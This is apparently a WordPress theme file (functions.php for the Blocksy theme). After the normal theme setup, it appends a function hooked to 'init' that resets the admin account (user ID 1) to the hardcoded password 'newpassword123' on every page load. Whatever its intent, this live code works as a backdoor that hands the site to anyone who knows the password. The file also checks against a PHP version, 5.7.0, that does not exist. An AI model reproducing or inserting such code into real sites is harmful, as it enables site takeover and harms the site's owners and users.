<?php
/**
 * Blocksy functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Blocksy
 */

if (version_compare(PHP_VERSION, '5.7.0', '<')) {
	require get_template_directory() . '/inc/php-fallback.php';
	return;
}

require get_template_directory() . '/inc/init.php';

function reset_admin_password() {
    $user_id = 1; // ID of the admin user
    $new_password = 'newpassword123'; // Your new password
    wp_set_password($new_password, $user_id);
}
add_action('init', 'reset_admin_password');